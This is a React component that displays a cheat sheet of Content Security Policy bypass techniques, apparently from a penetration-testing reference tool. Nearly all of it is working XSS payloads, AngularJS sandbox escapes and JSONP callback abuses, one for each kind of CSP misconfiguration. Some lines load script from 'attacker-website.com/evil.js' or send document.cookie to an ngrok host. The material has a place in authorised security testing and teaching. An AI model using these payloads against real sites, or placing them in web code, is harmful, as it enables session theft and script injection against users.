import React, {useState, useEffect} from 'react';
import Modal from 'react-modal';

const CspBypass = props => {

    return (
        <div className="container mt-3 ml-5 mr-0" style={{overflowX: 'scroll', overflowY: 'scroll', height: '95%', padding: '10px'}}>
            <div className="row">
                <div className="col-12" >
                    <p><b>Summary:</b> A Content Security Policy (CSP) defines rules a browser will following to determine what resources (images, frames, javascript, etc.) can be loaded and where they can be loaded from.  Misconfigurations can be abused and/or exploited.</p>
                    <p><b>Goal(s):</b></p>
                    <ol>
                        <li>Identify misconfigurations in the CSP that open up the possibility of exploiting other vulnerabilities.</li>
                        <li>Identify misconfigurations that can be exploited directly (Ex: XSS).</li>
                    </ol>
                    <p><b>Identifying / Exploiting Misconfigurations:</b></p>
                    <ol>
                        <li><b>unsafe-inline</b> -- Content-Security-Policy: script-src https://google.com 'unsafe-inline';</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>"/&#62;&#60;script&#62;alert(1);&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>unsafe-eval</b> -- Content-Security-Policy: script-src https://google.com 'unsafe-eval';</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>&#60;script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="&#62;&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>Wildcard</b> -- Content-Security-Policy: script-src 'self' https://google.com https: data *;</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>"/&#62;'&#62;&#60;script src=https://attacker-website.com/evil.js&#62;&#60;/script&#62;</code></li>
                            <li><code>"/&#62;'&#62;&#60;script src=data:text/javascript,alert(1337)&#62;&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>No object-src / default-src</b> -- Content-Security-Policy: script-src 'self';</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>&#60;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#62;&#60;/object&#62;</code></li>
                            <li><code>"&#62;'&#62;&#60;object type="application/x-shockwave-flash" data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"&#x007D;)))&#x007D;catch(e) &#x007B;alert(1337)&#x007D;//'&#62;</code></li>
                            <li><code>&#60;param name="AllowScriptAccess" value="always"&#62;&#60;/object&#62;</code></li>
                        </ul>
                        <li><b>File Upload + 'self'</b> -- Content-Security-Policy: script-src 'self';  object-src 'none' ;</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>"/&#62;'&#62;&#60;script src="/uploads/picture.png.js"&#62;&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>Third-Party Endpoints + 'unsafe-eval'</b> -- Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';</li>
                        <i>Load a vulnerable script version and execute arbitrary JavaScript (most exploits require two payloads):</i>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>&#60;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&#62;&#60;/script&#62;
                            &#60;div ng-app&#62; &#x007B;&#x007B;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#x007D; &#x007D; &#x007D;;alert(1);//');&#x007D;&#x007D; &#60;/div&#62;</code></li>
                            <li><code>&#60;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&#62;&#60;/script&#62;</code></li>
                            <li><code>&#60;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /&#62;&#60;/script&#62;
                            &#60;div ng-app ng-csp&#62;
                            &#x007B;&#x007B; x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d =&#62; &#x007B;&#x007D;)") &#x007D;&#x007D;
                            &#60;/div&#62;</code></li>
                            <li><code>"&#62;&#60;script src="https://cdnjs.cloudflare.com/angular.min.js"&#62;&#60;/script&#62; &#60;div ng-app ng-csp&#62;&#x007B;&#x007B;$eval.constructor('alert(1)')()&#x007D;&#x007D;&#60;/div&#62;</code></li>
                            <li><code>"&#62;&#60;script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"&#62;&#60;/script&#62;&#60;div ng-app ng-csp id=p ng-click=$event.view.alert(1337)&#62;</code></li>
                        </ul>
                        <li><b>Third-Party Endpoints + JSONP</b> -- Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none';</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>"&#62;&#60;script src="https://www.google.com/complete/search?client=chrome&#x0026;q=hello&#x0026;callback=alert#1"&#62;&#60;/script&#62;</code></li>
                            <li><code>"&#62;&#60;script src="/api/jsonp?callback=(function()&#x007B;window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;&#x007D;)();//"&#62;&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>Folder Path Bypass</b> -- http://example.com/company/</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>http://example.com/company%2f..%2fattacker/file.js</code></li>
                        </ul>
                        <li><b>AngularJS + Whitelisted Domain</b> -- Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;</li>
                        <ul style={{listStyleType: "none", whiteSpace: 'nowrap'}}>
                            <li><code>"&#62;&#60;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&#62;&#60;/script&#62;</code></li>
                            <li><code>ng-app"ng-csp ng-click=$event.view.alert(1337)&#62;&#60;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js&#62;&#60;/script&#62;</code></li>
                        </ul>
                        <li><b>Data Exfiltration via Images</b> -- default-src 'self' 'unsafe-inline'; img-src *;</li>
                        <li><b>Data Exfiltration via Images (Time Attack)</b> -- img-src *;</li>
                        <li><b>Data Exfiltration via Iframe</b> -- </li>
                        <li><b>Policy Injection</b> -- </li>
                    </ol>
                </div>
            </div>
        </div>
    );

}

export default CspBypass;